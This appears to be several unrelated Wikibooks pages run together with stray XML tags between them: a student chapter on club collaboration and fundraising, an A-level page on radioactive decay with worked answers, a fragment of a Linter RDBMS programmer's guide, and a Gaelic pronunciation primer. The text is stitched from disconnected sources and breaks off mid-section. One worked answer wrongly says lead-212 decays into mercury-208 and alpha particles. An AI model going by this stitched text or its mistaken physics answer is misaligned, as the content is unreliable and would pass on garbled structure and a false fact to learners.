There are many benefits that come along with collaborating with other clubs. The Students for Disability Awareness (SDA) have found that working with other clubs can really help to balance out the cost of the functions. SDA is very active and is constantly working towards new events to put on to spread the awareness of disabilities--around school and town. Funding is imperative when planning events/functions so by working with other organizations, SDA is able to do a lot more. They often work with AS Productions and AS Civil Controversy because those are larger clubs with a lot more funding from fundraising. Also, SDA works with smaller clubs that have similar goals to plan events and collaborate on how to spread awareness. During the Disability Awareness Week, SDA had to work with many other clubs to be able to put on the events they had planned. SDA worked with AS Civil Controversy to bring in a guest speaker to discuss what it's like to be a disabled transgender. By working together, these two clubs put on a great production and thus shows the benefits of clubs working together.

Another benefit that comes from clubs collaborating with one another is an increased potential for fundraising. The Students for Slum Doctors Program has been successful in fundraising by working with the Darfur Club. In the past these two clubs have joined together and experienced an increase in turnout and an increase in contributions at the events they hosted together.  In clubs that have a fairly specialized agenda and a small amount of participation from the community there is great potential in allocating resources.  By combining events and awareness activities with similar clubs more people are drawn to the events and there is a greater possibility for fundraising and spreading awareness. Other clubs, such as the World Injustice Awareness club have also had success with hosting joint movie nights to spread awareness and raise money. When trying to reach a large enough group to make a difference in fundraising and awareness joining efforts with similar clubs seems to be a technique that is very effective.

===What groups usually collaborate together===
It is necessary to realize that collaboration is not limited to clubs geared towards students only. Clubs can find allies in any similarly-themed organization, whether connected with the university or not. In addition to the on-campus Wellness and Prevention Center, the Western Men Against Violence club found they could be useful by helping the local Rape Prevention Center hot-line, often fundraising with them for the organization's benefit. They participate with other like-minded male and female community members and clubs in awareness activities like Walk a Mile in Her Shoes. They also are careful to not become too specialized. They don't hesitate to collaborate with females and participate in exclusive events like Take Back the Night.  However, they are mindful of who they associate with. For example, VOX Planned Parenthood initially wanted to collaborate, but Western Men Against Violence refused because of the concern that they would become associated with politically-charged topics. Moreover, they try to maintain their focus by keeping the club simplistic and always available for non-judgmental conversation. They keep their options open and don't discriminate heavily on who to participate with, so long as it is ultimately beneficial to feminist ideals.

A. As far as groups collaborating, the Photography club has the option to join and assist all clubs. They could easily come together with other clubs and help each other promote their clubs by taking pictures that show what the clubs are about and make posters with them. If there was only one club the Photography club would work well with though, it would have to be the Graphic Design club. With the combined passion of film and graphics, they would be able to create some amazing imagery not only to promote both groups but to sell as fundraisers as well. Collaborating between clubs would be the one element that would not only bring the clubs together, but it would possibly bring unity to Western as a community.

==Effective Place and Time for fundraising==

Planning a fundraiser is a lot of work in itself yet there are many other details that need to be considered before planning the actual event. Two of these important details include when and where the fundraiser will take place. Club members need to take into consideration the time of year when setting a date. For example, planning a fundraiser the weekend before finals would most likely conflict with many students study schedules therefore creating a low number of participants. Holiday weekends would also be poor timing for fundraisers. The time of day should also be well thought out whether the activity would be more effective in the morning, afternoon, or at night. Keep in mind the weather would also change with the time of day if the activity is planned for outside. Finally, where the activity takes place is crucial. If students are targeted for a fundraiser, somewhere close to campus would most likely be more effective then far away. If the community is targeted, there are many options and with good advertising anywhere may do. Clubs should also remember to think about the where and when access for their volunteers as well as targeted fundraiser participants.

===On Campus===
Events and club meetings that are on campus are more accessible for people that do not have cars. On campus meetings are also effective for new comers to the area, if you are not used to the town it is easier to find an event or club that is held on campus. In fund-raising it is better to accept donations rather than to have prices. for instance if you are selling cupcakes, you would receive more money by asking for donations rather than charging a dollar or whatever amount for one. you also need to have information on when the right time to accept donations, you don't want to be out fund-raising with another club at the same time in the same area. Theses techniques can be helpful for attaining money for club necessities.
On campus fundraising also has a better chance of reaching people who may not have known about your club or the event. If you do your event in a place where there is a lot of foot traffic i.e. red square there is a greater chance of someone who had no previous experience with the club to donate or help out. Especially if you are a student organization and you share you bring awareness to the struggle of your club, many other students will be willing to help fellow classmates. If people don't know that you need money for your club then they wont be able to help you. If your club is struggeling have a fundraiser and let people know and watch not only your money increase but people interested in your group and potential new members.
Funraising is only successful if there is an adequate amount of participation. It is easy to find this participation on campus through the means of signs, posters, facebook ads, email announcements, class announcements, etc. It is also a good way to get students involved in school activities and the value of being supportive to peers. By participating in fundraising a student learns how to give back to their community. The sense of giving that comes from donating can add character to a college student.

===Off Campus===
Off Campus fundraising can be very effective. LEAD has local businesses who donate (either food or money), who they have built a relationship with over the years. A key thing is to go to the same business so that they build a relationship with the club. Be sure to mention that they are supporting their local community. If you think of such organizations as Krispy Kreme, they help with fundraising. I have seen many student booths set up selling Krispy Kreme Donuts. They have official boxes that even say &quot;fundraising&quot; down the side.  Most businesses think that helping the community is good PR, so the majority of the time you can easily get businesses to agree to support you.

===Effective time to have a fundraising event===

For the Hui O' Hawaii club, spring, summer and the beginning of fall are going to be there best times for fundraising. They recently voted to purchase a shaved ice machine that they can use during spring, summer and part of fall quarter to sell shaved ice to students during the warm weather season.  This type of fundraising would effectively allow them to earn a lot of money and show to the rest of the community that they want to continue being part of the student body.  Another club that is good with putting on events is the Students for Disability Awareness club. The SDA devotes a week to their club for the public to participate and are able to rent out wheel chairs to put themselves in the shoes of a disabled person.  They also work with other organizations such as the AS Productions and the Civil Controversy Series to put on co-sponsor events which allow them to spread their word out while getting extra financial help from other organizations.

===Effective place for a fundraising event===

[[Category:{{FULLBOOKNAME}}|{{FULLCHAPTERNAME}}]]

There are many ideas to take into account when finding a location to fund raise. For most is population traffic. In order to fund raise efficiently, an organization needs to appeal to a large crowd, so locating in a spot with a high rate of pedestrian traffic is idea. A location such as red square is a good example, as the submarine team has fund raised there many times. It is a main hub for traffic through the university, and it is all by people on foot; people on foot are much more likely to stop and see what an organization has to say rather than that of a car-ridden person. Another aspect to consider about location is the type of people at that location, as an organization will be less successful in an area that does not support there cause, such as a Peta rally in a cattle town. Also it is wise to consider time of year, as a ski team fund raiser in the middle of summer is not the most ideal time of year to draw people's emotions to snow.

A great place to fund raise is at a concert, dance performance, theater performance, or comedy event.  If admission is free, students are much more likely to put a few bucks in a donation box.  If a hundred people each gave a dollar or two a club could make 100-200 dollars in a single event.  This can be a very effective way to raise money among students who often don't have more than a dollar or two to spare.</text>

      <text xml:space="preserve">==Decay Constant==
We can model radioactive decay by assuming that the probability that any one nucleus out of N nuclei decays in any one second is a constant &amp;lambda;. &amp;lambda; is known as the decay constant, and is measured in s&lt;sup&gt;-1&lt;/sup&gt; (technically the same as Hz, but it is a probability, not a frequency, so we use s&lt;sup&gt;-1&lt;/sup&gt;).

==Activity==
As our N nuclei decay, the number of nuclei decreases. The activity of the N nuclei we have left is, on average, the probability that any one nucleus will decay per. unit time multiplied by the number of nuclei. If we have 200 nuclei, and the decay constant is 0.5, we would expect, on average, 100 nuclei to decay in one second. This rate would decreases as time goes by. This gives us the following formula for the activity A of a radioactive sample:

&lt;math&gt;A = -\frac{dN}{dt} = \lambda N&lt;/math&gt;

Activity is always positive, and is measured in becquerels (Bq). It is easy to see that the rate of change of the number of nuclei is -A = -&amp;lambda;N.

==Decay==
The solution of the differential equation for activity given above is an [[A-level_Physics_(Advancing_Physics)/Exponential_Relationships|exponential relationship]]:

&lt;math&gt;N = N_0e^{-\lambda t}&lt;/math&gt;,

where N is the number of nuclei present at a time t, and N&lt;sub&gt;0&lt;/sub&gt; is the number of nuclei present at time t=0. You can define t=0 to be any point in time you like, provided you are consistent. Since A = &amp;lambda;N and therefore A&lt;sub&gt;0&lt;/sub&gt; = &amp;lambda;N&lt;sub&gt;0&lt;/sub&gt;:

&lt;math&gt;A = A_0e^{-\lambda t}&lt;/math&gt;,

where A is the activity of the sample at a time t, and A&lt;sub&gt;0&lt;/sub&gt; is the activity at time t=0.

==Questions==

1 mole = 6.02 x 10&lt;sup&gt;23&lt;/sup&gt; atoms

1u = 1.66 x 10&lt;sup&gt;-27&lt;/sup&gt;kg

1. Americium-241 has a decay constant of 5.07 x 10&lt;sup&gt;-11&lt;/sup&gt;s&lt;sup&gt;-1&lt;/sup&gt;. What is the activity of 1 mole of americium-241?

2. How many g of lead-212 (&amp;lambda; = 18.2&amp;mu;s&lt;sup&gt;-1&lt;/sup&gt;) are required to create an activity of 0.8 x 10&lt;sup&gt;18&lt;/sup&gt;Bq?

&lt;p&gt;'''Introduction'''&lt;/p&gt;

''Audience''&lt;/br&gt;
We have wren this Guide for programmers developing applications for Linter's RDBMS. The Guide assumes a basic knowledge of SQL database programming and system administration of your operating system.&lt;/br&gt;
If networking is involved in your application, the Guide assumes basic familiarity with network administration.&lt;/br&gt;
Where your application will be using the OBDC or JDBC driver, the С programming language, php, or a TCL/TK interface, we assume your basic familiarity with the relevant language or standard.&lt;/br&gt;

&lt;p&gt;'''What is Linter?'''&lt;/p&gt;
Linter is a Relational Data Base Management System. It includes tools, utilities and programs,
for:&lt;/br&gt;
• Creating, testing, and altering the structure of databases.&lt;/br&gt;
• Developing database applications in accordance with a variety of standards, using a variety of languages and Linter functions.&lt;/br&gt;
Some of these tools are implemented with a GUI interface, some are run from the command line.

&lt;p&gt;'''Note on Linter's Structure'''&lt;/p&gt;
Linter functions as an operating system running under, and subordinate to, the host operating system. For example, Linter maintains its own prioritized task scheduling and RAM/disk concurrency control. Most Linter functions require that the Linter kernel be running before the functions can operate.

&lt;p&gt;'''Text Conventions'''&lt;/p&gt;

      <text xml:space="preserve">1 mole = 6.02 x 10&lt;sup&gt;23&lt;/sup&gt; atoms

1u = 1.66 x 10&lt;sup&gt;-27&lt;/sup&gt;kg

'''1. Americium-241 has a decay constant of 5.07 x 10&lt;sup&gt;-11&lt;/sup&gt;s&lt;sup&gt;-1&lt;/sup&gt;. What is the activity of 1 mole of americium-241?'''

&lt;math&gt;A = \lambda N = 5.07 \times 10^{-11} \times 6.02 \times 10^{23} = 3.05 \times 10^{13}\mbox{ Bq}&lt;/math&gt;

This is why we only need very small samples for use in, for example, smoke detectors. In fact, safety considerations necessitate a small sample - otherwise we would all have cancer!

'''2. How many g of lead-212 (&amp;lambda; = 18.2&amp;mu;s&lt;sup&gt;-1&lt;/sup&gt;) are required to create an activity of 0.8 x 10&lt;sup&gt;18&lt;/sup&gt;Bq?'''

&lt;math&gt;N = \frac{A}{\lambda} = \frac{0.8 \times 10^{18}}{18.2 \times 10^{-6}} = 4.40 \times 10^{22}\mbox{ nuclei} = 4.40 \times 10^{22} \times 212 \times 1.66 \times 10^{-27} = 15.5\mbox{ g}&lt;/math&gt;

'''3. How long does it take for 2kg of lead-212 to decay to 1.5kg of lead-212?'''

Mass is proportional to the number of atoms, so:

&lt;math&gt;m = m_0e^{-\lambda t}&lt;/math&gt;

&lt;math&gt;\frac{m}{m_0} = e^{-\lambda t}&lt;/math&gt;

&lt;math&gt;\frac{m_0}{m} = e^{\lambda t}&lt;/math&gt;

&lt;math&gt;\lambda t = \ln{\frac{m_0}{m}}&lt;/math&gt;

&lt;math&gt;t = \frac{\ln{\frac{m_0}{m}}}{\lambda} = \frac{\ln{\frac{2}{1.5}}}{18.2 \times 10^{-6}} = 15807\mbox{ s} = 4.39\mbox{ hours}&lt;/math&gt;

'''4. Where does the missing 0.5kg go?'''

It becomes another isotope - in this case, mercury-208. Some also becomes alpha particles.

'''5. Some americium-241 has an activity of 3kBq. What is its activity after 10 years?'''

&lt;math&gt;A = A_0e^{-\lambda t} = 3000 \times e^{-5.07 \times 10^{-11} \times 10 \times 365.24 \times 24 \times 60 \times 60} = 2.952\mbox{ kBq}&lt;/math&gt;

'''6. This model of radioactive decay is similar to taking some dice, rolling them once per. second, and removing the dice which roll a one or a two. What is the decay constant of the dice?'''

The decay constant is the probability of removing a die - &amp;lambda; = ⅓.

'''7. If you started out with 10 dice, how many dice would you have left after 10s? What is the problem with this model of radioactive decay?'''

&lt;math&gt;N = N_0e^{-\lambda t} = 10 \times e^{-\frac{1}{3} \times 10} = 0.357\mbox{ dice}&lt;/math&gt;

Obviously, you can't have 0.357 dice. The problem with this model of radioactive decay is that, once you have sufficiently few nuclei, the decay ceases to be continuous. As time passes, the pattern becomes relatively more random. The model also says that the number of nuclei will always decrease. In reality, since there can only be an integer number of nuclei, there will eventually come a point when there are no nuclei left.

      <text xml:space="preserve">This article is a work in progress but will eventually teach the interested learner how to pronounce almost all Gaelic words according to the set of rules. It is particularly useful for travellers to the Highlands who may not need to speak the language but would love to know how to pronounce the '''place-names'''. It may also be used in conjunction with the other pages in this Wikibook to ensure correct pronunciation of Gaelic words. ''Please note that these are only approximate pronunciations, to aid simplicity.''

==Short Vowels==

Vowels in Gaelic can be both long and short.

*'''a''' represents the sound in English c'''a'''t.
*'''e''' represents the sound in English n'''e'''t.
*'''i''' represents the sound in English p'''i'''t.
*'''o''' represents the sound in English d'''o'''t.

Pretty simple, huh? Don't worry, it gets worse...

*'''u''' represents the sound in English b'''oo'''t.

==Long Vowels==

A grave accent over a vowel means that it's pronounced according to its long value rather than its short one. So, these are the long versions of the vowels;

*'''à''' represents the sound in English f'''a'''ther.
*'''è''' represents the sound in English f'''air''', although without any trace of an R on the end of the sound.
*'''ì''' represents the sound in English mach'''i'''ne.
*'''ò''' represents the sound in English h'''aw'''k.
*'''ù''' represents a sound pretty close to English br'''ewer''', but as a ''single sound'' (NOT broo-urr). Or try saying the vowel sound in ''pure'' without the Y that is often sounded before it.

==Broad and Slender==
Gaelic has two categories of vowels. A, O and U are classified as '''broad''', whereas E and I are classified as '''slender'''. There is a rule in Gaelic spelling that says &quot;caol ri caol agus leathann ri leathann&quot; - &quot;broad with broad and slender with slender&quot; - which basically says that, if you have a broad vowel before a group of consonants, you have to stick a broad vowel after it as well; and the same applies to slender vowels as well. 

You might be thinking, why bother? Well, the answer is that, as we will see later on, consonants sound different depending on whether they come before ''broad'' or ''slender'' vowels. Just giving you the heads-up in advance.

==Consonants==

Let's learn the basic rules first.

*'''p''' represents the sound in English '''p'''at.
*'''c''' represents the sound in English '''c'''at.
*'''t''' represents the sound in English '''t'''in.
*'''ng''' represents the sound in English si'''ng''', never as in fi'''ng'''er.
*'''s''' represents the sound in English '''s'''it.

Nothing new there then! Now for some slightly more tricky ones.

*'''l''' or '''ll''' is not quite the same as in English - it's more like the 'hollow' l in fu'''ll''', with the tongue touching the upper teeth. 
*'''nn''' is a bit like l above - hollow, without the vocal chords vibrating.

==This is Just the Beginning!==
And next, a group of consonants that all share the same, important rule.

*'''b''' represents the sound in English '''b'''at - ''at the beginning of a word only''; in other places it's pronounced like P.
*'''g''' - as in English '''g'''ood - ''at the beginning of a word only''; in other places it's pronounced like C.
*'''d''' - as in English '''d'''og - ''at the beginning of a word only''; in other places it's pronounced like T. Also, to pronounce it properly, the tongue should touch the upper teeth. Try it!
*'''n''' is a tricky one to get right. At the beginning of a word, it is like the English in '''n'''eed. Elsewhere, it's pronounced like '''nn''' above.
*'''r''' is another peculiar one. At the beginning of a word, it is like the English in '''r'''eed. Elsewhere, it's rolled, like the R in Spanish.

==Broadening your Outlook==
So far, we have only dealt with broad consonants - how consonants are pronounced when they come before a, o or u. When they go before '''e or i''', they're said differently! Fortunately, there is one relatively simple rule; '''stick a Y in'''. Let's see some examples;

*'''p''' becomes like in English '''p'''ew.

And some more; but don't forget the rule mentioned earlier.

*'''b''' becomes like in English '''b'''eautiful, with a Y sound after the B. (But ''only at the beginning of a word!'')
